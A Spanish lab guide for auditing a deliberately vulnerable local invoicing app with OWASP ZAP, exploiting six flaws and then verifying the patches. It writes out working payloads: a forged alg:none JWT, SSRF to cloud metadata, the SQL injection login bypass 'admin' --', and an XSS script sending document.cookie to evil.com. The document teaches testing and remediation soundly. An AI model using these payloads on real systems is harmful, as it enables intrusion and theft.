# Guía paso a paso: Auditoría de MiniFacturas con OWASP ZAP

Esta guía aplica el procedimiento de la Sección 5 y 7 de la guía del laboratorio
(Manual Explore, HUD, Breakpoints, Requester) directamente sobre los endpoints
reales de **MiniFacturas**. Repite todo el proceso dos veces:

1. Sobre el código del commit `feat: ... con 6 vulnerabilidades` (Fase 2 — diagnóstico).
2. Sobre el código del commit `fix: remediación ...` (Fase 4 — re-escaneo de verificación).

```bash
# Para auditar la versión VULNERABLE:
git checkout 2b6afd4
node server.js        # http://localhost:3000

# Para auditar la versión PARCHEADA:
git checkout 3eb347f
export JWT_SECRET="cambia-esto-por-algo-largo-y-aleatorio"
node server.js
```

---

## Fase 1 — Despliegue y configuración de ZAP

1. Arranca MiniFacturas (`node server.js`) y confirma en el navegador que
   `http://localhost:3000` carga el formulario de login.
2. Abre OWASP ZAP → **Manual Explore**.
3. URL base: `http://localhost:3000`.
4. Click **Launch Browser** (Chrome/Firefox integrado con el HUD de ZAP activo).

## Fase 2 — Diagnóstico manual y explotación de las 6 vulnerabilidades

### Mapeo con el HUD
Navega manualmente por:
- `/` (login)
- `/perfil` (requiere login previo)
- `/facturas` (requiere login previo)
- El formulario de búsqueda (`/search?q=...`)

Verifica en la pestaña **Sites** de ZAP que los endpoints usados por el
JavaScript del frontend también quedan registrados: `/login`, `/api/me`,
`/api/profile`, `/api/avatar`, `/api/invoices/:id`, `/api/profile-form`.
Si alguno no aparece, dispáralo manualmente desde la UI (ej. consulta una
factura, actualiza el perfil, pide un avatar) para que ZAP lo capture.

### 1. JWT — Broken Authentication
1. Inicia sesión como `carlos` / `carlos123` y observa en **Breakpoints**
   (`Ctrl+B`) o en el historial la cookie `session=<JWT>`.
2. Copia el JWT y decodifícalo (jwt.io o el HUD) para ver el payload
   `{"sub":1,"username":"carlos","role":"user",...}`.
3. En el módulo **Requester**, construye un token forjado:
   - Header: `{"alg":"none","typ":"JWT"}`
   - Payload: `{"sub":2,"username":"admin","role":"admin","exp":9999999999}`
   - Firma: vacía (`header_b64.payload_b64.`)
4. Envía `GET /api/me` con `Cookie: session=<token forjado>`.
   - **Versión vulnerable**: responde `200` con los datos de "admin".
   - **Versión parcheada**: responde `401` — alg:none es rechazado.

### 2. SSRF
1. En **Requester**, envía `POST /api/avatar` con body
   `{"url":"http://localhost:3000/internal/secret"}`.
   - **Vulnerable**: el servidor hace el fetch y devuelve el `internal_api_key`.
   - **Parcheada**: `400` — "Host no autorizado".
2. Repite con `http://169.254.169.254/latest/meta-data/` (metadata de nube)
   para confirmar el mismo bloqueo.

### 3. CSRF
1. Inicia sesión como `carlos` en el navegador lanzado por ZAP (deja la pestaña abierta).
2. Abre `csrf-poc.html` (archivo local del repo) en una **segunda pestaña** del
   mismo navegador — simula el sitio del atacante.
3. Observa en el historial de ZAP la petición `POST /api/profile-form`
   que se dispara automáticamente.
   - **Vulnerable**: `200 OK`, el rol de carlos cambia a `admin` en la base de datos.
   - **Parcheada**: `403 Forbidden` — "Token CSRF inválido o ausente".

### 4. SQL Injection
1. En **Requester**, sobre `POST /login`, modifica el body a:
   `username=admin' --&password=cualquiera`
   - **Vulnerable**: `302` a `/perfil`, sesión iniciada como admin sin
     conocer la contraseña real (ver el log del servidor: la consulta SQL
     concatenada queda impresa en consola).
   - **Parcheada**: `401 Unauthorized`.

### 5. XSS reflejado
1. Con **Breakpoints** activos o directo en el navegador, visita:
   `GET /search?q=<script>fetch('http://evil.com/steal?c='+document.cookie)</script>`
   - **Vulnerable**: el `<script>` queda sin escapar en el HTML de respuesta
     (confírmalo con "Ver código fuente", no solo el DOM renderizado).
   - **Parcheada**: la respuesta contiene `&lt;script&gt;...&lt;/script&gt;`.

### 6. IDOR / Mass Assignment
1. Inicia sesión como `carlos` (`owner_id = 1`).
2. En **Requester**, `GET /api/invoices/4` (factura que pertenece a `admin`, id=2).
   - **Vulnerable**: `200 OK`, devuelve la factura ajena completa.
   - **Parcheada**: `403 Forbidden`.
3. Para Mass Assignment, `PUT /api/profile` con body `{"role":"admin"}`
   (agrega el header `X-CSRF-Token` con el valor de la cookie `csrf_token`
   para que la petición no sea rechazada por el parche de CSRF y así aislar
   la prueba de Mass Assignment).
   - **Vulnerable**: el campo `role` se actualiza en la base de datos.
   - **Parcheada**: la respuesta ignora `role` (DTO allowlisting), solo
     `email` se actualiza si se envía.

### Generación del reporte de diagnóstico inicial
En ZAP: **Report → Generate Report** (HTML/PDF) justo después de terminar
la Fase 2 sobre la versión vulnerable. Guarda este reporte para el Anexo
del informe final (contiene las alertas automáticas de ZAP además de tu
explotación manual).

## Fase 3 — Remediación en código fuente (SAST)

Ya aplicada en el commit `fix: remediación ...`. Revisa el diff:

```bash
git diff 2b6afd4 3eb347f -- server.js jwt-secure.js db.js
```

Cada parche está comentado en el código con `// PARCHE: ...` justo al lado
del `// (!) VULNERABLE: ...` original, para que sea fácil enlazar código
vulnerable ↔ código corregido en tu informe.

## Fase 4 — Re-escaneo manual de verificación

Repite exactamente los 6 pasos de la Fase 2 contra la versión parcheada
(`git checkout` al commit `fix`, recordando exportar `JWT_SECRET`). Cada
prueba debe fallar (401/403/campo filtrado) tal como se documentó arriba.
Genera un segundo reporte de ZAP (**Report → Generate Report**) y compáralo
con el inicial para la tabla comparativa de alertas del Resumen Ejecutivo.

---

## Tabla resumen para tu Resumen Ejecutivo

| Vulnerabilidad | Antes del parche | Después del parche |
|---|---|---|
| JWT alg:none | Acceso como admin sin credenciales | `401 No autenticado` |
| SSRF | Filtra `internal_api_key` | `400 Host no autorizado` |
| CSRF | Cambia `role` sin consentimiento | `403 Token CSRF inválido` |
| SQL Injection | Bypass de login con `admin' --` | `401 Credenciales inválidas` |
| XSS reflejado | `<script>` ejecutable en el navegador | Texto escapado, inofensivo |
| IDOR | Lee factura de otro usuario | `403 No tienes permiso` |
| Mass Assignment | `role` se sobrescribe desde el cliente | Campo ignorado (allowlist) |
